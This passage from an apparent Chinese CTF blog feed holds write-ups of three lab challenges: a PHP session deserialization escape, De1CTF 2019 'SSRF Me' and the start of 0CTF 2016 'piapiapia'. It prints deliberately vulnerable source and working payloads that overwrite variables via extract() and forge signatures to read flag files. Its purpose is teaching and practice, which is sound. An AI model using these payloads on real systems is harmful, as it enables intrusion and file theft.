preg_replace($filter,&#39;&#39;,$img);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if($_SESSION)&#123;</span><br><span class="line">  unset($_SESSION);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$_SESSION[&quot;user&quot;] &#x3D; &#39;guest&#39;;</span><br><span class="line">$_SESSION[&#39;function&#39;] &#x3D; $function;</span><br><span class="line"></span><br><span class="line">extract($_POST);</span><br><span class="line"></span><br><span class="line">if(!$function)&#123;</span><br><span class="line">  echo &#39;&lt;a href&#x3D;&quot;index.php?f&#x3D;highlight_file&quot;&gt;source_code&lt;&#x2F;a&gt;&#39;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(!$_GET[&#39;img_path&#39;])&#123;</span><br><span class="line">  $_SESSION[&#39;img&#39;] &#x3D; base64_encode(&#39;guest_img.png&#39;);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">  $_SESSION[&#39;img&#39;] &#x3D; sha1(base64_encode($_GET[&#39;img_path&#39;]));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$serialize_info &#x3D; filter(serialize($_SESSION));</span><br><span class="line"></span><br><span class="line">if($function &#x3D;&#x3D; &#39;highlight_file&#39;)&#123;</span><br><span class="line">  highlight_file(&#39;index.php&#39;);</span><br><span class="line">&#125;else if($function &#x3D;&#x3D; &#39;phpinfo&#39;)&#123;</span><br><span class="line">  eval(&#39;phpinfo();&#39;); &#x2F;&#x2F;maybe you can find something in here!</span><br><span class="line">&#125;else if($function &#x3D;&#x3D; &#39;show_image&#39;)&#123;</span><br><span class="line">  $userinfo &#x3D; unserialize($serialize_info);</span><br><span class="line">  echo file_get_contents(base64_decode($userinfo[&#39;img&#39;]));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>正式审计前，我注意到了题目一个很大的提示</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#125;else if($function &#x3D;&#x3D; &#39;phpinfo&#39;)&#123;</span><br><span class="line">  eval(&#39;phpinfo();&#39;); &#x2F;&#x2F;maybe you can find something in here!</span><br></pre></td></tr></table></figure><p>顺着提示，赋值f=phpinfo进行查询。</p><p><img src="/2021/08/19/buu/14/image-20210819094711265.png"></p><p>找到了d0g3_f1ag.php，猜测flag在其中</p><p>接下来代码审计</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params">$img</span>)</span>&#123;</span><br><span class="line">    $filter_arr = <span class="keyword">array</span>(<span class="string">&#x27;php&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;php5&#x27;</span>,<span class="string">&#x27;php4&#x27;</span>,<span class="string">&#x27;fl1g&#x27;</span>);</span><br><span class="line">    $filter = <span class="string">&#x27;/&#x27;</span>.implode(<span class="string">&#x27;|&#x27;</span>,$filter_arr).<span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> preg_replace($filter,<span class="string">&#x27;&#x27;</span>,$img);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$serialize_info = filter(serialize($_SESSION));</span><br></pre></td></tr></table></figure><p>filter函数是为了过滤用的</p><p>过滤了很多关键字，比如php，flag，若遇到会正则替换为空</p><p>之后还会序列化，所以我们要反序列化操作一手</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>($_SESSION)&#123;</span><br><span class="line">    <span class="keyword">unset</span>($_SESSION);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$_SESSION[<span class="string">&quot;user&quot;</span>] = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line">$_SESSION[<span class="string">&#x27;function&#x27;</span>] = $function;</span><br><span class="line"></span><br><span class="line">extract($_POST);</span><br></pre></td></tr></table></figure><p>我萌发现unset函数将$_SESSION销毁了</p><p>然后重新赋予$_SESSION了新的值。</p><p>最后调用了extract($_POST);</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">extract() 函数从数组中将变量导入到当前的符号表。</span><br></pre></td></tr></table></figure><h5 id="举例extract-变量覆盖"><a href="#举例extract-变量覆盖" class="headerlink" title="举例extract()变量覆盖"></a>举例extract()变量覆盖</h5><p>根据extract()我们可以进行变量覆盖，</p><p>当我们传入SESSION[flag]=123时，$SESSION[“user”]和$SESSION[‘function’] 全部会消失。</p><p>只剩下_SESSION[flag]=123。</p><p><img src="/2021/08/19/buu/14/1947190-20200419170914367-953947353.png" alt="img"></p><h6 id="键值逃逸"><a href="#键值逃逸" class="headerlink" title="键值逃逸"></a>键值逃逸</h6><p>原理:因为序列化后的字符串是严格的，对应的格式不能错，比如s:4:”name”,那s:4就必须有一个字符串长度是4的否则就往后截取</p><p>并且unserialize会把多余的字符串当垃圾处理，在花括号内的就是正确的，花括号后面的就都被扔掉。</p><p>示例：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#正规序列化的字符串</span></span><br><span class="line">$a = <span class="string">&quot;a:2:&#123;s:3:\&quot;one\&quot;;s:4:\&quot;flag\&quot;;s:3:\&quot;two\&quot;;s:4:\&quot;test\&quot;;&#125;&quot;</span>;</span><br><span class="line">var_dump(unserialize($a));</span><br><span class="line"><span class="comment">#带有多余的字符的字符串</span></span><br><span class="line">$a_laji = <span class="string">&quot;a:2:&#123;s:3:\&quot;one\&quot;;s:4:\&quot;flag\&quot;;s:3:\&quot;two\&quot;;s:4:\&quot;test\&quot;;&#125;;s:3:\&quot;真的垃圾img\&quot;;lajilaji&quot;</span>;</span><br><span class="line">var_dump(unserialize($a_laji));</span><br></pre></td></tr></table></figure><p>有了这个逃逸概念的话，就大概可以理解了。</p><p>如果我们把$_SESSION[‘img’] = base64_encode(‘guest_img.png’);这段代码的img属性放到花括号外边去</p><p>然后花括号中注好新的img属性，那么他本来要求的img属性就被咱们替换了。</p><p>payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_SESSION[phpflag]&#x3D;;s:7:&quot;xxxxxxx&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA&#x3D;&#x3D;&quot;;&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_SESSION[phpflag]&#x3D;;s:14:&quot;phpflagphpflag&quot;;s:7:&quot;xxxxxxx&quot;;s:3:&quot;img&quot;;s:20:&quot;L2QwZzNfZmxsbGxsbGFn&quot;;&#125;</span><br></pre></td></tr></table></figure><p><img src="/2021/08/19/buu/14/image-20210819210654326.png" alt="image-20210819210654326"></p><p><img src="/2021/08/19/buu/14/image-20210819210523566.png" alt="image-20210819210523566"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;0x00知识点&quot;&gt;&lt;a href=&quot;#0x00知识点&quot; class=&quot;headerlink&quot; title=&quot;0x00知识点&quot;&gt;&lt;/a&gt;0x00知识点&lt;/h4&gt;&lt;p&gt;[&lt;a href=&quot;https://www.cnblogs.com/wangtanzhi/p/122</summary>
      
    
    
    
    
    <category term="buu" scheme="http://daweitech.github.io/tags/buu/"/>
    
  </entry>
  
  <entry>
    <title>De1CTF 2019 SSRF Me</title>
    <link href="http://daweitech.github.io/2021/08/18/buu/13/"/>
    <id>http://daweitech.github.io/2021/08/18/buu/13/</id>
    <published>2021-08-18T12:01:04.000Z</published>
    <updated>2021-08-24T12:23:17.655Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h4 id="0x00知识点"><a href="#0x00知识点" class="headerlink" title="0x00知识点"></a>0x00知识点</h4><h4 id="0x01解题"><a href="#0x01解题" class="headerlink" title="0x01解题"></a>0x01解题</h4><p>靶机开启</p><p><img src="/2021/08/18/buu/13/image-20210818200351121.png" alt="image-20210818200351121"></p><p>明显的python代码段，复制下来并进行整理</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#encoding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line">reload(sys)</span><br><span class="line">sys.setdefaultencoding(<span class="string">&#x27;latin1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">secert_key = os.urandom(<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Task</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, action, param, sign, ip</span>):</span><span class="comment">#是一个简单的赋值函数</span></span><br><span class="line">        self.action = action</span><br><span class="line">        self.param = param</span><br><span class="line">        self.sign = sign</span><br><span class="line">        self.sandbox = md5(ip)</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">not</span> os.path.exists(self.sandbox)):<span class="comment">#如果没有该文件夹，则创立一个文件夹</span></span><br><span class="line">            os.mkdir(self.sandbox)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Exec</span>(<span class="params">self</span>):</span></span><br><span class="line">    result = &#123;&#125;</span><br><span class="line">    result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">500</span></span><br><span class="line">    <span class="keyword">if</span> (self.checkSign()):</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;scan&quot;</span> <span class="keyword">in</span> self.action:</span><br><span class="line">            tmpfile = open(<span class="string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="string">&#x27;w&#x27;</span>)   <span class="comment">#注意w，可以对result.txt文件进行修改</span></span><br><span class="line">            resp = scan(self.param)</span><br><span class="line">            <span class="keyword">if</span> (resp == <span class="string">&quot;Connection Timeout&quot;</span>):</span><br><span class="line">                result[<span class="string">&#x27;data&#x27;</span>] = resp</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">print</span> resp</span><br><span class="line">                tmpfile.write(resp)<span class="comment">#这个将resp中的数据写入result.txt中，可以利用为将flag.txt中的数据放进result.txt中</span></span><br><span class="line">                tmpfile.close()</span><br><span class="line">            result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">200</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;read&quot;</span> <span class="keyword">in</span> self.action:</span><br><span class="line">            f = open(<span class="string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="string">&#x27;r&#x27;</span>)<span class="comment">#打开方式为只读</span></span><br><span class="line">            result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">200</span></span><br><span class="line">            result[<span class="string">&#x27;data&#x27;</span>] = f.read()<span class="comment">#读取result.txt中的数据</span></span><br><span class="line">        <span class="keyword">if</span> result[<span class="string">&#x27;code&#x27;</span>] == <span class="number">500</span>:</span><br><span class="line">            result[<span class="string">&#x27;data&#x27;</span>] = <span class="string">&quot;Action Error&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">500</span></span><br><span class="line">        result[<span class="string">&#x27;msg&#x27;</span>] = <span class="string">&quot;Sign Error&quot;</span></span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">checkSign</span>(<span class="params">self</span>):</span></span><br><span class="line">    <span class="keyword">if</span> (getSign(self.action, self.param) == self.sign):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"><span class="meta">        @app.route(&quot;/geneSign&quot;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">geneSign</span>():</span></span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">&quot;param&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line">    action = <span class="string">&quot;scan&quot;</span></span><br><span class="line">    <span class="keyword">return</span> getSign(action, param)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(&#x27;/De1ta&#x27;,methods=[&#x27;GET&#x27;,&#x27;POST&#x27;])#注意这个绑定，接下来的几个函数都很重要，这个相当于c语言里面的主函数，接下来是调用其他函数的过程</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">challenge</span>():</span></span><br><span class="line">    action = urllib.unquote(request.cookies.get(<span class="string">&quot;action&quot;</span>))<span class="comment">#cookie传递action参数，对应不同的处理方式</span></span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">&quot;param&quot;</span>, <span class="string">&quot;&quot;</span>))<span class="comment">#传递get方式的参数param</span></span><br><span class="line">    sign = urllib.unquote(request.cookies.get(<span class="string">&quot;sign&quot;</span>))<span class="comment">#cookie传递sign参数sign</span></span><br><span class="line">    ip = request.remote_addr<span class="comment">#获取请求端的ip地址</span></span><br><span class="line">    <span class="keyword">if</span>(waf(param)):<span class="comment">#调用waf函数进行过滤</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;No Hacker!!!!&quot;</span></span><br><span class="line">    task = Task(action, param, sign, ip) <span class="comment">#创建Task类对象</span></span><br><span class="line">    <span class="keyword">return</span> json.dumps(task.Exec())<span class="comment">#以json的形式返回到客户端</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(&#x27;/&#x27;)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    <span class="keyword">return</span> open(<span class="string">&quot;code.txt&quot;</span>,<span class="string">&quot;r&quot;</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">scan</span>(<span class="params">param</span>):</span></span><br><span class="line">    socket.setdefaulttimeout(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">return</span> urllib.urlopen(param).read()[:<span class="number">50</span>]<span class="comment">#这个可以利用为访问flag.txt。读取然后为下一步将flag.txt文件中的东西放到result.txt中做铺垫</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Connection Timeout&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getSign</span>(<span class="params">action, param</span>):</span><span class="comment">#getSign的作用是拼接secret_key,param,action，然后返回拼接后的字符串的md5加密值</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(secert_key + param + action).hexdigest()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5</span>(<span class="params">content</span>):</span><span class="comment">#将传入的字符串进行md5加密</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(content).hexdigest()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">waf</span>(<span class="params">param</span>):</span><span class="comment">#防火墙的作用是判断开头的几个字母是否是gopher 或者是file  如果是的话，返回true</span></span><br><span class="line">    check=param.strip().lower()</span><br><span class="line">    <span class="keyword">if</span> check.startswith(<span class="string">&quot;gopher&quot;</span>) <span class="keyword">or</span> check.startswith(<span class="string">&quot;file&quot;</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.debug = <span class="literal">False</span></span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>,port=<span class="number">9999</span>)</span><br></pre></td></tr></table></figure><p>代码审计：</p><h5 id="1-flask框架"><a href="#1-flask框架" class="headerlink" title="1.flask框架"></a>1.flask框架</h5><h5 id="2-De1ta和-geneSign"><a href="#2-De1ta和-geneSign" class="headerlink" title="2./De1ta和/geneSign"></a>2./De1ta和/geneSign</h5><h5 id="3-task类"><a href="#3-task类" class="headerlink" title="3.task类"></a>3.task类</h5><p>得到flag的大致思路有了：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">首先绕过self.checkSign()，并且传入的action需要同时包含scan和read，然后if &quot;scan&quot; in self.action:执行将flag.txt中的数据写入result.txt中，继续if &quot;read&quot; in self.action:执行读取result.txt中的数据，并且放在 result[&#39;data&#39;] 中 ， return json.dumps(task.Exec())   接着返回以json的形式返回到客户端。</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">@app.route(&quot;&#x2F;geneSign&quot;, methods&#x3D;[&#39;GET&#39;, &#39;POST&#39;])</span><br><span class="line">def geneSign():</span><br><span class="line">    param &#x3D; urllib.unquote(request.args.get(&quot;param&quot;, &quot;&quot;))</span><br><span class="line">    action &#x3D; &quot;scan&quot;</span><br><span class="line">    return getSign(action, param)</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">def checkSign(self):</span><br><span class="line">        if (getSign(self.action, self.param) &#x3D;&#x3D; self.sign):</span><br><span class="line">            return True</span><br><span class="line">        else:</span><br><span class="line">            return False</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">def getSign(action, param):#getSign的作用是拼接secret_key,param,action，然后返回拼接后的字符串的md5加密值</span><br><span class="line">    return hashlib.md5(secert_key + param + action).hexdigest()</span><br></pre></td></tr></table></figure><p>需要满足函数</p><p>self.checkSign()</p><p>则需满足</p><p><strong>getSign(self.action, self.param) == self.sign，（而sign值通过cookie传值</strong>）</p><p>也就需要</p><p><strong>hashlib.md5(secert_key + param + action).hexdigest() == self.sign</strong></p><p>=&gt;<strong>hashlib.md5(secert_key + ‘flag.txt’ + ‘readscan’).hexdigest() == self.sign</strong></p><p>我们需要得到**secert_key + ‘flag.txtreadscan’**的哈希值</p><p>我们还不懂secret_key的值是多少，它只存在于服务端，但是我们可以通过上面截取的源码中/geneSign，来返回我们所需要的编码之后的哈希值</p><p>注意到/geneSign中已经将action定为scan，所以我们传入的param可以为flag.txtread，这样的话还是会拼接为secert_key + ‘flag.txtreadscan’</p><h5 id="payload1"><a href="#payload1" class="headerlink" title="payload1"></a>payload1</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;geneSign?param&#x3D;flag.txtread</span><br></pre></td></tr></table></figure><p><img src="/2021/08/18/buu/13/image-20210818205021931.png" alt="image-20210818205021931"></p><p>得到哈希值后，将flag.txt中的数据读入result.txt，然后读取result.txt</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> <span class="string">&quot;scan&quot;</span> <span class="keyword">in</span> self.action:</span><br><span class="line">              tmpfile = open(<span class="string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="string">&#x27;w&#x27;</span>)   <span class="comment">#注意w，可以对result.txt文件进行修改</span></span><br><span class="line">              resp = scan(self.param)</span><br><span class="line">              <span class="keyword">if</span> (resp == <span class="string">&quot;Connection Timeout&quot;</span>):</span><br><span class="line">                  result[<span class="string">&#x27;data&#x27;</span>] = resp</span><br><span class="line">              <span class="keyword">else</span>:</span><br><span class="line">                  <span class="keyword">print</span> resp</span><br><span class="line">                  tmpfile.write(resp)<span class="comment">#这个将resp中的数据写入result.txt中，可以利用为将flag.txt中的数据放进result.txt中</span></span><br><span class="line">                  tmpfile.close()</span><br><span class="line">              result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">200</span></span><br><span class="line">          <span class="keyword">if</span> <span class="string">&quot;read&quot;</span> <span class="keyword">in</span> self.action:</span><br><span class="line">              f = open(<span class="string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="string">&#x27;r&#x27;</span>)<span class="comment">#打开方式为只读</span></span><br><span class="line">              result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">200</span></span><br><span class="line">              result[<span class="string">&#x27;data&#x27;</span>] = f.read()<span class="comment">#读取result.txt中的数据</span></span><br><span class="line">          <span class="keyword">if</span> result[<span class="string">&#x27;code&#x27;</span>] == <span class="number">500</span>:</span><br><span class="line">              result[<span class="string">&#x27;data&#x27;</span>] = <span class="string">&quot;Action Error&quot;</span></span><br></pre></td></tr></table></figure><h5 id="payload2"><a href="#payload2" class="headerlink" title="payload2"></a>payload2</h5><p>伪造cookie的值</p><p><img src="/2021/08/18/buu/13/image-20210818205732109.png" alt="image-20210818205732109"></p><h5 id="参考博客："><a href="#参考博客：" class="headerlink" title="参考博客："></a>参考博客：</h5><p><a href="https://blog.csdn.net/RABCDXB/article/details/115412359">https://blog.csdn.net/RABCDXB/article/details/115412359</a></p><p><a href="https://www.cnblogs.com/zzjdbk/p/13685940.html">https://www.cnblogs.com/zzjdbk/p/13685940.html</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[TOC]&lt;/p&gt;
&lt;h4 id=&quot;0x00知识点&quot;&gt;&lt;a href=&quot;#0x00知识点&quot; class=&quot;headerlink&quot; title=&quot;0x00知识点&quot;&gt;&lt;/a&gt;0x00知识点&lt;/h4&gt;&lt;h4 id=&quot;0x01解题&quot;&gt;&lt;a href=&quot;#0x01解题&quot; class=</summary>
      
    
    
    
    
    <category term="buu" scheme="http://daweitech.github.io/tags/buu/"/>
    
  </entry>
  
  <entry>
    <title>0CTF 2016 piapiapia</title>
    <link href="http://daweitech.github.io/2021/08/17/buu/12/"/>
    <id>http://daweitech.github.io/2021/08/17/buu/12/</id>
    <published>2021-08-17T12:05:50.000Z</published>
    <updated>2021-08-24T12:25:44.275Z</updated>
    
    <content type="html"><![CDATA[<h4 id="0x00知识点"><a href="#0x00知识点" class="headerlink" title="0x00知识点"></a>0x00知识点</h4><ul><li><h5 id="信息泄露"><a href="#信息泄露" class="headerlink" title="信息泄露"></a>信息泄露</h5></li><li><h5 id="参数传递数组绕过字符串检测"><a href="#参数传递数组绕过字符串检测" class="headerlink" title="参数传递数组绕过字符串检测"></a>参数传递数组绕过字符串检测</h5></li><li><h5 id="反序列化字符逃逸"><a href="#反序列化字符逃逸" class="headerlink" title="反序列化字符逃逸"></a>反序列化字符逃逸</h5><h5 id="参考博客"><a href="#参考博客" class="headerlink" title="参考博客"></a>参考博客</h5><p><a href="https://www.cnblogs.com/g0udan/p/12216207.html">0CTF 2016]piapiapia解题详细思路及复现 - g0udan - 博客园 (cnblogs.com)</a></p></li></ul><h4 id="0x01解题"><a href="#0x01解题" class="headerlink" title="0x01解题"></a>0x01解题<img src="/2021/08/17/buu/12/image-20210817200805927.png" alt="image-20210817200805927"></h4><p>进来是一个登录页面，很难登录，且也不是什么sql注入</p><p>f12无发现</p><p>这时候请出dirsearch(记得调低线程，不然会漏掉<a href="http://www.zip/">www.zip</a>)</p><p><img src="/2021/08/17/buu/12/image-20210817201129087.png" alt="image-20210817201129087"></p><p>通过后台扫描我们有了register页面，也就是注册页面</p><p>还有<a href="http://www.zip,config.php,update.php,这些我们后面都要用到./">www.zip,config.php,update.php,这些我们后面都要用到。</a></p><p><img src="/2021/08/17/buu/12/image-20210817204317100.png" alt="image-20210817204317100"></p><p>注册后登录</p><p><img src="/2021/08/17/buu/12/image-20210817201432160.png" alt="image-20210817201432160"></p><p><img src="/2021/08/17/buu/12/image-20210817201501824.png" alt="image-20210817201501824"></p><p>进入到updat.php,提示我们上传文件，本来我还以为是传图片马</p><p>结果本题核心不是，是前面扫出的<a href="http://www.zip源码提示了绕过/">www.zip源码提示了绕过</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">&lt; ?php</span><br><span class="line">require_once(&#39;class.php&#39;);</span><br><span class="line">if ($_SESSION[&#39;username&#39;] &#x3D;&#x3D; null) &#123;</span><br><span class="line">die(&#39;Login First&#39;);</span><br><span class="line">&#125;</span><br><span class="line">if ($_POST[&#39;phone&#39;] &amp; &amp; $_POST[&#39;email&#39;] &amp; &amp; $_POST[&#39;nickname&#39;] &amp; &amp; $_FILES[&#39;photo&#39;]) &#123;</span><br><span class="line"></span><br><span class="line">$username &#x3D; $_SESSION[&#39;username&#39;];</span><br><span class="line">if (!preg_match(&#39;&#x2F;^\d&#123;11&#125;$&#x2F;&#39;, $_POST[&#39;phone&#39;]))</span><br><span class="line">die(&#39;Invalid phone&#39;);</span><br><span class="line"></span><br><span class="line">if (!preg_match(&#39;&#x2F;^[_a-zA-Z0-9]&#123;1,10&#125;@[_a-zA-Z0-9]&#123;1,10&#125;\.[_a-zA-Z0-9]&#123;1,10&#125;$&#x2F;&#39;, $_POST[&#39;email&#39;]))</span><br><span class="line">die(&#39;Invalid email&#39;);</span><br><span class="line"></span><br><span class="line">if 